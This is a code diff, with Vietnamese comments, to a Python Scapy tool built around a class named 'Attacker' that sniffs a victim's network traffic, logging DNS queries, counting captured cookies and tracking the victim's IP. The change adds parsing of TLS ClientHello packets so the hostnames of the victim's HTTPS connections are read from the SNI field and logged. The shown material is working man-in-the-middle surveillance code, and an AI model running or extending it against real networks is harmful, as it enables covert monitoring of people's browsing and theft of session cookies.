@@ -9,6 +9,7 @@ from scapy.all import (
     Raw,            # Dữ liệu thô (HTTP payload)
     sniff,          # Hàm bắt gói tin
     send,           # Hàm gửi gói tin
+    TCP,
     arping,         # Hàm quét ARP
     get_if_hwaddr,  # Lấy MAC address
     conf,            # Cấu hình Scapy
@@ -19,6 +20,8 @@ from scapy.all import (
     ICMPv6NDOptSrcLLAddr,   # Option chứa MAC nguồn
     in6_getifaddr           # Lấy địa chỉ IPv6 của máy mình
 )
+load_layer("tls") 
+from scapy.layers.tls.all import TLSClientHello, TLSExtServerNameIndication
 import netifaces as ni
 import sys
 import os
@@ -666,7 +669,6 @@ class Attacker:
                 break
     
     def packet_callback(self, pkt):
-        """Xử lý packets bắt được"""
         try:
             # DNS Queries
             if pkt.haslayer(DNSQR):
@@ -742,6 +744,22 @@ class Attacker:
                                 self.dashboard.increment('cookies')
                 
                 except:
+                    pass
+            elif pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(TLSClientHello):
+                try:
+                    # Lấy lớp TLS Client Hello
+                    client_hello = pkt[TLSClientHello]
+                    # Duyệt qua các Extension để tìm SNI
+                    if hasattr(client_hello, 'ext'):
+                        for ext in client_hello.ext:
+                            if isinstance(ext, TLSExtServerNameIndication):
+                                for servername in ext.servernames:
+                                    hostname = servername.servername.decode('utf-8')
+                                    console.print(f"[yellow]🔒 HTTPS (SNI):[/yellow] {hostname}")
+                                    self.logger.log_http(self.victim_ip, hostname, " (Encrypted)")
+                                    if self.dashboard: self.dashboard.increment('https_requests')
+                                break 
+                except Exception:
                     pass
         
         except Exception as e:
